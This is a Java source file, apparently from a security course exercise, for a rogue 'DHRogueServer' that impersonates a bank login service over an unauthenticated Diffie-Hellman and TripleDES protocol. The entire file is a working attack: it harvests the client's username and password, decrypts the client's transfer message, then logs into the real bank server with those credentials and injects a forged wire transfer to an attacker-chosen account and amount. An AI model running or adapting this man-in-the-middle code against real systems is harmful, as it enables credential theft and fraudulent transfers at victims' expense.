import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.AlgorithmParameterGenerator;
import java.security.AlgorithmParameters;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.InvalidParameterSpecException;
import java.security.spec.X509EncodedKeySpec;
import java.text.MessageFormat;
import java.util.Scanner;

import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyAgreement;
import javax.crypto.SecretKey;
import javax.crypto.spec.DHParameterSpec;

import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class DHRougueServer {

	public static void usage() {
		System.err
				.println("Usage: java DHRogueServer <listen-port> <server> <server-port> <dest-account-number> <amount>");
		System.exit(1);
	}

	public static void main(String args[]) {
		int serverPort;
		int listenPort;
		String server;
		long destAccountNumber;
		int amount;

		if (args.length != 5)
			usage();

		listenPort = Integer.parseInt(args[0]);
		server = args[1];
		serverPort = Integer.parseInt(args[2]);
		destAccountNumber = Long.parseLong(args[3]);
		amount = Integer.parseInt(args[4]);

		server(listenPort, server, serverPort, destAccountNumber, amount);
	}

	private static void server(int listenPort, String server, int serverPort,
			long destAccountNumber, int amount) {

		// Listen for incoming connections
		String[] credAndMsg = listener(listenPort);

		// Get source account number from msg
		String msg = credAndMsg[0];
		Scanner sc = new Scanner(msg);
		sc.useDelimiter("[^0-9]+");
		sc.nextLong();
		long sourceAccountNumber = sc.nextLong();

		// Send the injected message
		client(server, serverPort, credAndMsg[1], credAndMsg[2],
				sourceAccountNumber, destAccountNumber, amount);
	}

	private static String[] listener(int listenPort) {
		Socket s = null;
		ServerSocket serverS = null;
		String reply;
		String[] credAndMsg = new String[3];
		BASE64Decoder base64Dec = new BASE64Decoder();
		BASE64Encoder base64Enc = new BASE64Encoder();

		try {
			try {
				serverS = new ServerSocket(listenPort);

				System.out.println("Listening...");
				s = serverS.accept();
				DataInputStream in = new DataInputStream(s.getInputStream());
				DataOutputStream out = new DataOutputStream(s.getOutputStream());

				// send the ehlo to the client
				out.writeUTF("EHLO <safest bank customer login>");

				// recieve credentials
				reply = in.readUTF();
				if (!reply.matches("^EHLO <.*,.*>$")) {
					System.err
							.println("Didn't recieve credentials after welcome\n"
									+ "Recieved: \"" + reply + "\"\n");
					System.exit(1);
				}
				credAndMsg = reply.split("(^EHLO <|,|>)");

				// reply with "OK"
				out.writeUTF("OK");

				// send DH params to client
				String params = genDhParams(512);
				out.writeUTF(params);

				String[] values = params.split(",");
				BigInteger p = new BigInteger(values[0]);
				BigInteger g = new BigInteger(values[1]);
				int l = Integer.parseInt(values[2]);

				// generate your public key using the DH params
				KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DH");
				DHParameterSpec dhSpec = new DHParameterSpec(p, g, l);
				keyGen.initialize(dhSpec);
				KeyPair keypair = keyGen.generateKeyPair();
				PrivateKey privateKey = keypair.getPrivate();
				PublicKey publicKey = keypair.getPublic();

				// send your public key to the client
				out.writeUTF(base64Enc.encode(publicKey.getEncoded()));

				// get clients's public key
				reply = in.readUTF();
				// Convert the public key bytes into a PublicKey object
				X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(
						base64Dec.decodeBuffer(reply));
				KeyFactory keyFact = KeyFactory.getInstance("DH");
				PublicKey publicKeyClient = keyFact.generatePublic(x509KeySpec);

				// again, send an "OK" to the client
				out.writeUTF("OK");

				// calculate shared encryption key
				KeyAgreement ka = KeyAgreement.getInstance("DH");
				ka.init(privateKey);
				ka.doPhase(publicKeyClient, true);
				SecretKey secretKey = ka.generateSecret("TripleDES");

				// recieve the message
				String encMsg = in.readUTF();

				// decrypt message with shared secret
				TripleDesEncrypter tripleDes = new TripleDesEncrypter(secretKey);
				credAndMsg[0] = tripleDes.decrypt(encMsg);

				System.out.println("original message from client:\n"
						+ credAndMsg[0]);

				// send OK
				out.writeUTF("OK");

				System.out.println("Transfer successfully recieved!\n");

				return credAndMsg;
			} finally {
				// close connection
				if (s != null) {
					s.close();
				}
				if (serverS != null) {
					serverS.close();
				}
			}
		} catch (Exception e) {
			// handle exceptions
			e.printStackTrace();
			System.exit(1);
		}
		return null;
	}

	// Returns a comma-separated string of 3 values.
	// The first number is the prime modulus P.
	// The second number is the base generator G.
	// The third number is bit size of the random exponent L.
	private static String genDhParams(int bitLength) {
		try {
			// Create the parameter generator for a 1024-bit DH key pair
			AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator
					.getInstance("DH");
			paramGen.init(bitLength);

			// Generate the parameters
			AlgorithmParameters params = paramGen.generateParameters();
			DHParameterSpec dhSpec = (DHParameterSpec) params
					.getParameterSpec(DHParameterSpec.class);

			// Return the three values in a string
			return "" + dhSpec.getP() + "," + dhSpec.getG() + ","
					+ dhSpec.getL();
		} catch (NoSuchAlgorithmException e) {
		} catch (InvalidParameterSpecException e) {
		}
		return null;
	}

	private static void client(String server, int serverPort, String user,
			String pw, long sourceAccountNumber, long destAccountNumber,
			int amount) {
		Socket s = null;
		String reply;
		BASE64Decoder base64Dec = new BASE64Decoder();
		BASE64Encoder base64Enc = new BASE64Encoder();

		try {
			try {
				s = new Socket(server, serverPort);
				DataInputStream in = new DataInputStream(s.getInputStream());
				DataOutputStream out = new DataOutputStream(s.getOutputStream());

				// receive the ehlo from the server
				reply = in.readUTF();
				if (!reply.equals("EHLO <safest bank customer login>")) {
					System.err.println("Didn't recieve welcome post\n");
					System.exit(1);
				}

				// reply with your inetsec credentials and immatriculation
				// number
				out.writeUTF("EHLO <" + user + "," + pw + ">");

				// check if the server replied with "OK"
				reply = in.readUTF();
				if (!reply.equals("OK")) {
					System.err.println("Didn't recieve ok reply after login\n");
					System.exit(1);
				}

				// get DH params from server
				reply = in.readUTF();
				String[] values = reply.split(",");
				BigInteger p = new BigInteger(values[0]);
				BigInteger g = new BigInteger(values[1]);
				int l = Integer.parseInt(values[2]);

				// generate your public key using the DH params
				KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DH");
				DHParameterSpec dhSpec = new DHParameterSpec(p, g, l);
				keyGen.initialize(dhSpec);
				KeyPair keypair = keyGen.generateKeyPair();
				PrivateKey privateKey = keypair.getPrivate();
				PublicKey publicKey = keypair.getPublic();

				// get server's public key
				reply = in.readUTF();
				// Convert the public key bytes into a PublicKey object
				X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(
						base64Dec.decodeBuffer(reply));
				KeyFactory keyFact = KeyFactory.getInstance("DH");
				PublicKey publicKeyServer = keyFact.generatePublic(x509KeySpec);

				// send your public key to the server
				out.writeUTF(base64Enc.encode(publicKey.getEncoded()));

				// again, check for an "OK" by the server
				reply = in.readUTF();
				if (!reply.equals("OK")) {
					System.err
							.println("Didn't recieve ok reply after sending public key\n");
					System.exit(1);
				}

				// calculate shared encryption key
				KeyAgreement ka = KeyAgreement.getInstance("DH");
				ka.init(privateKey);
				ka.doPhase(publicKeyServer, true);
				SecretKey secretKey = ka.generateSecret("TripleDES");

				// construct a message
				Object[] messageArgs = { new String("Destination Acc.no.:"),
						new Long(destAccountNumber),
						new String("Source Acc.no.     :"),
						new Long(sourceAccountNumber),
						new String("Amount (in US$)    :"), new Long(amount) };

				String message = MessageFormat
						.format("---------- secure banking wire transfer message ----------\n"
								+ "{0} {1,number,000000000000000}\n"
								+ "{2} {3,number,000000000000000}\n"
								+ "{4} {5,number,000000000000000}\n"
								+ "------------------ end of wire transfer ------------------\n",
								messageArgs);

				System.out.println("injected message to server: \n" + message);

				// encrypt message with shared secret
				TripleDesEncrypter tripleDes = new TripleDesEncrypter(secretKey);
				String encMsg = tripleDes.encrypt(message);

				// send encrypted message
				out.writeUTF(encMsg);
				reply = in.readUTF();
				if (!reply.equals("OK")) {
					System.err
							.println("Didn't recieve ok reply after sending transfer\n");
					System.exit(1);
				}

				System.out.println("Transfer successfully sent!\n");
			} finally {
				// close connection
				if (s != null) {
					s.close();
				}
			}
		} catch (Exception e) {
			// handle exceptions
			e.printStackTrace();
			System.exit(1);
		}
	}

	private static class TripleDesEncrypter {

		private Cipher ecipher;
		private Cipher dcipher;

		public TripleDesEncrypter(SecretKey key) {
			try {
				ecipher = Cipher.getInstance("TripleDES");
				dcipher = Cipher.getInstance("TripleDES");
				ecipher.init(Cipher.ENCRYPT_MODE, key);
				dcipher.init(Cipher.DECRYPT_MODE, key);

			} catch (javax.crypto.NoSuchPaddingException e) {
			} catch (java.security.NoSuchAlgorithmException e) {
			} catch (java.security.InvalidKeyException e) {
			}
		}

		public String encrypt(String str) {
			try {
				// Encode the string into bytes using utf-8
				byte[] utf8 = str.getBytes("UTF8");

				// Encrypt
				byte[] enc = ecipher.doFinal(utf8);

				// Encode bytes to base64 to get a string
				return new sun.misc.BASE64Encoder().encode(enc);
			} catch (javax.crypto.BadPaddingException e) {
			} catch (IllegalBlockSizeException e) {
			} catch (UnsupportedEncodingException e) {
			}
			return null;
		}

		public String decrypt(String str) {
			try {
				// Decode base64 to get bytes
				byte[] dec = new sun.misc.BASE64Decoder().decodeBuffer(str);

				// Decrypt
				byte[] utf8 = dcipher.doFinal(dec);

				// Decode using utf-8
				return new String(utf8, "UTF8");
			} catch (javax.crypto.BadPaddingException e) {
			} catch (IllegalBlockSizeException e) {
			} catch (UnsupportedEncodingException e) {
			} catch (java.io.IOException e) {
			}
			return null;
		}
	}
}
